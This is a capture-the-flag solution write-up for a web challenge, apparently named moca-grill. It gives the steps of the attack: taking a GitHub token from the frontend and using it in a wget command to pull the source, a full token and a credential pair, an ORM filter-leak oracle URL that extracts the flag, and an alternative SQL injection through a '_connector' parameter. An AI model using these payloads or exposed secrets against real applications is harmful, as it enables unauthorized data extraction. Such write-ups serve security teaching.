# Official solution

- Get the github token from the frontend
- Leak the source code using
```
wget "https://api.github.com/repos/mocarrosticino/moca-grill/tarball/v1.0.0" --header "Authorization: token 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"
```
- Get the credentials of the `la brace` owner (`labrace`:`46cedd9800ad9d56142d8980ace782a9`)
- Find the ORM leak vuln in the `/manage/` API endpoint
- use the oracle `/api/v1/manage/?user__review__order__shop__order__review__comment__contains=<you flag up to now>` to fully leak the flag


In order to understand better, this is similar to the actual query that the backend does with this injection:

```SQL
SELECT *
FROM REVIEW r1

INNER JOIN ORDER rr ON rr.pk = r1.order_pk
INNER JOIN SHOP ss ON ss.pk = rr.shop_pk

INNER JOIN USER u1 ON r1.user_pk = u1.pk    // associ ad ogni review l'utente ce l'ha fatta
INNER JOIN REVIEW r2 ON r2.user_pk = u1.pk  // associ ad ogni utente tutte le sue review
INNER JOIN ORDER o1 ON o1.pk = r2.order_pk  // associ ad ogni review l'ordine associato
INNER JOIN SHOP s1 ON s1.pk = o1.shop_pk    // associ ad ogni ordine lo shop nel quale è stato fatto
INNER JOIN ORDER o2 ON o2.shop_pk = s1.pk   // associ ad ogni shop tutti i suoi ordini
INNER JOIN REVIEW r3 ON r3.order_pk = o2.pk // associ ad ogni shop tutte le sue review

WHERE ss.owner_pk = <owner di la brace> AND r3.comment LIKE "%MOCA%"
```

## Slightly different solution from Pwnterroni team (kudos to them!!)

`/api/v1/manage/?order__shop=1&_connector=OR 1)) OR ? LIMIT 21; -- a&order__shop__owner=1`
